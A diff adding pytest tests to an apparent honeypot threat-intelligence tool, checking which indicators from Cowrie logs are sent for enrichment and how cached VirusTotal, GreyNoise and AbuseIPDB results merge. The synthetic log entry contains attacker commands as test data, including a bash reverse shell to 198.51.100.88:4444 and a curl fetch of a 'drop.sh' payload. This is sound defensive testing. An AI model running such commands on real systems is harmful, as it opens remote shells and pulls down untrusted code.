@@ -1813,3 +1813,146 @@ class TestV15RunnerUpgrades:
             (IOC_TYPE_DOMAIN, ["stager.example.org"]),
             (IOC_TYPE_IP, ["203.0.113.5"]),
         ]
+
+    @pytest.mark.asyncio()
+    async def test_static_benign_infra_skipped_from_enrichment_quota_but_shared_url_kept(
+        self, tmp_path: Path
+    ) -> None:
+        """Public resolvers, utility hosts, and shared-host apex domains do not burn API quota,
+        while path-specific URLs on shared hosts (raw.githubusercontent.com/<path>) still enrich."""
+        from lantana.common.config import (
+            OperationConfig,
+            OperatorConfig,
+            RedactConfig,
+            ReportingConfig,
+            SecretsConfig,
+            SharingConfig,
+            StixExportConfig,
+        )
+        from lantana.enrichment.runner import IOC_TYPE_URL, run_enrichment
+
+        secrets = SecretsConfig(vault_apikey_virustotal="SYNTHETIC_TEST_VT_000000")
+        reporting = ReportingConfig(
+            operator=OperatorConfig(
+                name="op", handle="op", contact="op@example.com", pgp_fingerprint=""
+            ),
+            sharing=SharingConfig(tlp="GREEN", community="", discord_channel=""),
+            operation=OperationConfig(
+                name="op_vt", description="", sector="", region="", start_date="2026-06-18"
+            ),
+            redact=RedactConfig(),
+            stix=StixExportConfig(allowlist_domains=["partner.example.org"]),
+        )
+        bronze = pl.DataFrame(
+            {
+                "src_ip": ["203.0.113.5"],
+                "eventid": ["cowrie.command.input"],
+                "input": [
+                    "curl https://ifconfig.me/ip; "
+                    "curl https://github.com/; "
+                    "curl https://raw.githubusercontent.com/attacker/repo/main/drop.sh; "
+                    "curl https://partner.example.org/x; "
+                    "nc -zv 1.1.1.1 53; "
+                    "bash -i >& /dev/tcp/198.51.100.88/4444 0>&1"
+                ],
+                "timestamp": [datetime(2026, 6, 18, 12, 0, 0)],
+                "server": ["sn-test"],
+            }
+        )
+        stage_log: list[tuple[str, list[str]]] = []
+
+        async def fake_enrich(
+            provider_name: str,
+            provider: object,
+            ioc_type: str,
+            iocs: list[str],
+            cache: sqlite3.Connection,
+            errors: ErrorAccumulator,
+            **_kwargs: object,
+        ) -> tuple[list[EnrichmentResult], int]:
+            stage_log.append((ioc_type, list(iocs)))
+            return [], 0
+
+        with (
+            patch("lantana.enrichment.runner.load_secrets", return_value=secrets),
+            patch("lantana.enrichment.runner.load_reporting", return_value=reporting),
+            patch(
+                "lantana.enrichment.runner.read_bronze_ndjson",
+                side_effect=lambda _d, dataset: bronze if dataset == "cowrie" else pl.DataFrame(),
+            ),
+            patch("lantana.enrichment.runner._enrich_iocs_with_provider", side_effect=fake_enrich),
+            patch("lantana.enrichment.runner.normalize_dataset", return_value=pl.DataFrame()),
+        ):
+            await run_enrichment(
+                target_date=date(2026, 6, 18),
+                cache_db_path=tmp_path / "cache.db",
+                errors_path=tmp_path / "errors.json",
+                provider_state_path=tmp_path / "state.json",
+            )
+
+        assert stage_log == [
+            (IOC_TYPE_IP, ["198.51.100.88"]),
+            (IOC_TYPE_URL, ["https://raw.githubusercontent.com/attacker/repo/main/drop.sh"]),
+            (IOC_TYPE_IP, ["203.0.113.5"]),
+        ]
+
+    def test_load_enrichment_cache_lookup_merges_all_providers_by_default(
+        self, tmp_path: Path
+    ) -> None:
+        """Default load_enrichment_cache_lookup merges VT, GreyNoise, and AbuseIPDB per IOC."""
+        from lantana.enrichment.runner import load_enrichment_cache_lookup
+
+        db_path = tmp_path / "multi_cache.db"
+        conn = _init_cache(db_path)
+        now = datetime.now(tz=UTC)
+        _set_cached(
+            conn,
+            "virustotal",
+            IOC_TYPE_IP,
+            "198.51.100.88",
+            EnrichmentResult(
+                provider="virustotal",
+                ip="198.51.100.88",
+                data={"vt_status": "found", "vt_malicious_count": 4, "virustotal_risk_score": 50.0},
+                queried_at=now,
+            ),
+        )
+        _set_cached(
+            conn,
+            "greynoise",
+            IOC_TYPE_IP,
+            "198.51.100.88",
+            EnrichmentResult(
+                provider="greynoise",
+                ip="198.51.100.88",
+                data={
+                    "greynoise_classification": "benign",
+                    "greynoise_riot": True,
+                    "greynoise_risk_score": 0.0,
+                },
+                queried_at=now,
+            ),
+        )
+        _set_cached(
+            conn,
+            "abuseipdb",
+            IOC_TYPE_IP,
+            "198.51.100.88",
+            EnrichmentResult(
+                provider="abuseipdb",
+                ip="198.51.100.88",
+                data={"abuseipdb_confidence_score": 85, "abuseipdb_risk_score": 85.0},
+                queried_at=now,
+            ),
+        )
+        conn.close()
+
+        merged = load_enrichment_cache_lookup(db_path)
+        entry = merged[(IOC_TYPE_IP, "198.51.100.88")]
+        assert entry["vt_malicious_count"] == 4
+        assert entry["greynoise_riot"] is True
+        assert entry["greynoise_classification"] == "benign"
+        assert entry["abuseipdb_confidence_score"] == 85
+
+        vt_only = load_enrichment_cache_lookup(db_path, provider="virustotal")
+        assert "greynoise_riot" not in vt_only[(IOC_TYPE_IP, "198.51.100.88")]
